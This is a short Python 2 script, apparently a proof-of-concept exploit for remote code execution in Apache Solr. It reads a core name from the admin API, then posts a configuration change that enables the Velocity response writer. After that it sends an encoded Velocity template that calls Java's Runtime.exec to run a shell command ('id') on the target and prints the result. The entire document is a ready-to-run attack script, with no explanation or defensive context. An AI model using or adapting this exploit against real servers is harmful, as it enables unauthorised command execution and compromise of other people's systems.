import requests
import json
import sys


def get_name(url):
    print "[-] Get core name."
    url += "/solr/admin/cores?wt=json&indexInfo=false"
    conn = requests.request("GET", url=url)
    name = "test"
    try:
        name = list(json.loads(conn.text)["status"])[0]
    except:
        pass
    return name


def update_config(url, name):

    url += "/solr/"+name+"/config"
    print "[-] Update config.", url
    headers = {"Content-Type": "application/json",
               "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"}
    post_data = """
    {
      "update-queryresponsewriter": {
        "startup": "lazy",
        "name": "velocity",
        "class": "solr.VelocityResponseWriter",
        "template.base.dir": "",
        "solr.resource.loader.enabled": "true",
        "params.resource.loader.enabled": "true"
      }
    }
    """
    conn = requests.request("POST", url, data=post_data, headers=headers)
    if conn.status_code != 200:
        print "update config error: ", conn.status_code
        sys.exit(1)


def poc(url):
    core_name = get_name(url)
    update_config(url, core_name)
    print "[-] Start get ."
    url += "/solr/"+core_name+"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
    conn = requests.request("GET", url)
    print conn.text


if __name__ == '__main__':
    # print sys.argv[0], "http://127.0.0.1"
    target = sys.argv[1]
    poc(target)
